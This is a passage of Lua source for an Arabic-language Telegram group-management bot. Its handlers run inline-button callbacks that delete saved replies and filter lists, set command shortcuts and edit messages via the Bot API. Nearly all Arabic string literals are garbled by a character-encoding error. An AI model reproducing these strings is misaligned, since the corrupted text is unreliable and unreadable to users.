keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if DataText and DataText:match('/DelListAll:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelListAll:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:BanAll:')
DevRio:del(Rinda..'Rio:MuteAll:')
Text = "*โ๏ธฐุชู ุญุฐู ูุงุฆูู ุงูุนุงู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Rinda..'Rio:Lock:GpRd'..data.chat_id_) then
local Rio = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevRio:smembers(Rinda..'Rio:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู*"
else
for k,v in pairs(redod) do
DevRio:del(Rinda..'Rio:Gif:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Voice:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Audio:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Photo:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Stecker:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Video:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:File:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpRed'..v..data.chat_id_)
DevRio:del(Rinda..'Rio:Manager:GpRed'..data.chat_id_)
end
Text = "*โ๏ธฐุชู ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevRio:get(Rinda..'Rio:Lock:GpRd'..data.chat_id_) then
local Rio = DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevRio:smembers(Rinda.."Rio:Sudo:AllRed")
if #redod == 0 then
Text = "*โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู*"
else
for k,v in pairs(redod) do
DevRio:del(Rinda.."Rio:Add:AllRed"..v)
DevRio:del(Rinda.."Rio:Gif:AllRed"..v)
DevRio:del(Rinda.."Rio:Voice:AllRed"..v)
DevRio:del(Rinda.."Rio:Audio:AllRed"..v)
DevRio:del(Rinda.."Rio:Photo:AllRed"..v)
DevRio:del(Rinda.."Rio:Stecker:AllRed"..v)
DevRio:del(Rinda.."Rio:Video:AllRed"..v)
DevRio:del(Rinda.."Rio:File:AllRed"..v)
DevRio:del(Rinda.."Rio:Text:AllRed"..v)
DevRio:del(Rinda.."Rio:Sudo:AllRed")
end
Text = "*โ๏ธฐุชู ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end 
if DataText and DataText:match('/ChangeRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/ChangeRed:'..tonumber(data.sender_user_id_)..'(.*)')
if not Bot(data) and DevRio:get(Rinda..'Rio:Lock:Rd'..data.chat_id_) then 
Dev_Rio(data.chat_id_, data.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุงุถุงูู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(data) then
Dev_Rio(data.chat_id_, data.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
DevRio:set(Rinda..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_,'SetGpRed')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ุงูุงู") 
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Rinda..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "ุงูุบุงุก" then 
Dev_Rio(data.chat_id_, data.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
return false
end
Text = "โ๏ธฐุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โข โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููููู ุงุถุงูุฉ ุงูู ุงููุต โข โค\n-----------------------------------------\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#msgs` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\n-----------------------------------------\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )\n โ"
DevRio:set(Rinda..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_,'SaveGpRed')
DevRio:set(Rinda..'Rio:Add:GpText'..data.sender_user_id_..data.chat_id_,text)
DevRio:sadd(Rinda..'Rio:Manager:GpRed'..data.chat_id_,text)
DevRio:set(Rinda..'DelManagerRep'..data.chat_id_,text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุบูุฑ ุงูุฑุฏ โข",callback_data="/ChangeRed:"..data.sender_user_id_}},{{text="โข ุงูุบุงุก โข",callback_data="/CancelRed:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/ChangeAllRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/ChangeAllRed:'..tonumber(data.sender_user_id_)..'(.*)')
if not Bot(data) and DevRio:get(Rinda..'Rio:Lock:Rd'..data.chat_id_) then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูุง ุชุณุชุทูุน ุงุถุงูู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู") 
return false
end
if not SecondSudo(data) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูููุทูุฑ ุงูุซุงููู ูุงุนูู ููุท") 
else
DevRio:set(Rinda.."Rio:Add:AllRed"..data.sender_user_id_,'SetAllRed')
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ุงูุงู") 
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Rinda.."Rio:Add:AllRed"..data.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "ุงูุบุงุก" then 
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ") 
DevRio:del(Rinda..'Rio:Add:AllRed'..data.sender_user_id_)
return false
end
Text = "โ๏ธฐุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โข โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููููู ุงุถุงูุฉ ุงูู ุงููุต โข โค\n-----------------------------------------\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#datas` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\n-----------------------------------------\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )\n โ"
DevRio:set(Rinda.."Rio:Add:AllRed"..data.sender_user_id_,'SaveAllRed')
DevRio:set(Rinda.."Rio:Add:AllText"..data.sender_user_id_, text)
DevRio:sadd(Rinda.."Rio:Sudo:AllRed",text)
DevRio:set(Rinda.."DelSudoRep",text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุบูุฑ ุงูุฑุฏ โข",callback_data="/ChangeAllRed:"..data.sender_user_id_}},{{text="โข ุงูุบุงุก โข",callback_data="/CancelAllRed:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelCmd:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelCmd:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevRio:del(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevRio:del(Rinda.."List:Cmd:Group:New"..data.chat_id_)
end
Text = "โ๏ธฐุชู ุญุฐู ุงูุงูุงูุฑ ุงููุถุงูู ูู ุงููุฌููุนู"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/CmdList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text or redod).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/SetCmd:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/SetCmd:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุง","ุงูุฏู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุง")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ู","ุฑูุน ูููุฒ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุงุฏ","ุฑูุน ุงุฏูู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุงุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ูุฏ","ุฑูุน ูุฏูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ูุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ูู","ุฑูุน ููุดุฆ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ูู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุงุณ","ุฑูุน ููุดุฆ ุงุณุงุณู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุงุณ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ูุท","ุฑูุน ูุทูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ูุท")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุซุงููู","ุฑูุน ูุทูุฑ ุซุงููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุซุงููู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุชู","ุชูุฒูู ุงููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุชู")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุชุนุท","ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุชุนุท")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุชูุน","ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุชูุน")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุฑ","ุงูุฑุงุจุท")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุฑ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุฑุฑ","ุฑุฏูุฏ ุงููุฏูุฑ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุฑุฑ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุุ","ูุณุญ ุงูููุชูููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุุ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุฑุฏ","ุงุถู ุฑุฏ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุฑุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":ุบ","ุบูููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"ุบ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..data.chat_id_..":#","ูุณุญ ูุงุฆูู ุงูุนุงู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..data.chat_id_,"#")
Text = "โ๏ธฐุชู ุชุฑุชูุจ ุงูุงูุงูุฑ ุจุงูุดูู ุงูุชุงูู ~\nโ๏ธฐ ุงูุฏู - ุง .\nโ๏ธฐ ุฑูุน ูููุฒ - ู .\nโ๏ธฐุฑูุน ุงุฏูู - ุงุฏ .\nโ๏ธฐ ุฑูุน ูุฏูุฑ - ูุฏ . \nโ๏ธฐ ุฑูุน ููุดู - ูู . \nโ๏ธฐ ุฑูุน ููุดุฆ ุงูุงุณุงุณู - ุงุณ  .\nโ๏ธฐ ุฑูุน ูุทูุฑ - ูุท .\nโ๏ธฐุฑูุน ูุทูุฑ ุซุงููู - ุซุงููู .\nโ๏ธฐ ุชูุฒูู ุงููู - ุชู .\nโ๏ธฐ ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู - ุชุนุท .\nโ๏ธฐ ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู - ุชูุน .\nโ๏ธฐ ุงูุฑุงุจุท - ุฑ .\nโ๏ธฐ ุฑุฏูุฏ ุงููุฏูุฑ - ุฑุฑ .\nโ๏ธฐ ูุณุญ ุงูููุชูููู - ุุ .\nโ๏ธฐ ุงุถู ุฑุฏ - ุฑุฏ .\nโ๏ธฐ ูุณุญ ุณุญูุงุชู - ุณุญ .\nโ๏ธฐ ูุณุญ ุฑุณุงุฆูู - ุฑุณ .\nโ๏ธฐ ุบูููู - ุบ .\nโ๏ธฐูุณุญ ูุงุฆูู ุงูุนุงู"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/CmdList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/CancelAllRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/CancelAllRed:'..tonumber(data.sender_user_id_)..'(.*)')
local DelSudoRep = DevRio:get(Rinda..'DelSudoRep')
DevRio:del(Rinda.."Rio:Sudo:AllRed",DelSudoRep)
DevRio:del(Rinda.."Rio:Add:AllText"..data.sender_user_id_)
DevRio:del(Rinda.."Rio:Add:AllRed"..data.sender_user_id_)
DevRio:del(Rinda.."DelSudoRep")
Text = "โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if DataText and DataText:match('/CancelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/CancelRed:'..tonumber(data.sender_user_id_)..'(.*)')
local DelManagerRep = DevRio:get(Rinda..'DelManagerRep'..data.chat_id_)
DevRio:srem(Rinda..'Rio:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevRio:del(Rinda..'Rio:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevRio:del(Rinda..'Rio:Add:GpRed'..data.sender_user_id_..data.chat_id_)
DevRio:del(Rinda..'DelManagerRep'..data.chat_id_)
Text = "โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงูุฑุฏ"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/CmdList:(.*)') then
local Rio = DataText:match('/CmdList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Cmd = DevRio:get(Rinda..'Rio:Cmd')
local Text = [[
*โ๏ธฐูู ุฎูุงู ุงูุงุฒุฑุงุฑ ููููู ุงูุชุญูู ุจุฃูุงูุฑ ุงููุฌููุนู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุฑุชูุจ ุงูุงูุงูุฑ โข",callback_data="/SetCmd:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงูุงูุฑ ุงููุถุงูู โข",callback_data="/DelCmd:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Cmd or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelHome:(.*)') then
local Rio = DataText:match('/DelHome:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Msg = DevRio:get(Rinda..'Rio:Msg')
local Text = [[
*โ๏ธฐูู ุฎูุงู ุงูุงุฒุฑุงุฑ ููููู ูุณุญ ุฑุณุงุฆูู ูุณุญูุงุชู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุฑุณุงุฆูู โข",callback_data="/DelMsg:"..data.sender_user_id_},{text="โข ูุณุญ ุณุญูุงุชู โข",callback_data="/DelEdit:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Msg or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelEdit:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelEdit:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:EditMsg'..data.chat_id_..':'..data.sender_user_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุชุนุฏููุงุชู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/DelHome:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelMsg:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelMsg:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุฑุณุงุฆูู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/DelHome:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/FilterList:(.*)') then
local Rio = DataText:match('/FilterList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Filter = DevRio:get(Rinda..'Rio:Filter')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูููุน โขโฏ
-----------------------------------------
*โ๏ธฐููููู ูุณุญ ุงูููููุนุงุช ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุชุญุฑูุงุช โข",callback_data="/DelGif:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุตูุงุช โข",callback_data="/DelSticker:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูุตูุฑ โข",callback_data="/DelPhoto:"..data.sender_user_id_},{text="โข ูุณุญ ุงููููุงุช โข",callback_data="/DelTextfilter:"..data.sender_user_id_}},{{text="โข ูุณุญ ููุงุฆู ุงูููุน โข",callback_data="/DelAllFilter:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelGif:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelGif:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:FilterAnimation"..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุงููุชุญุฑูุงุช ุงูููููุนู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/FilterList:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/DelSticker:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelSticker:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:FilterSteckr"..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุงูููุตูุงุช ุงูููููุนู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/FilterList:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/DelPhoto:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelPhoto:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:FilterPhoto"..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุงูุตูุฑ ุงูููููุนู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/FilterList:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/DelTextfilter:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelTextfilter:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Filters:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุฌููุน ุงููููุงุช ุงูููููุนู ุถูุนู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุฑุฌูุน โข",callback_data="/FilterList:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
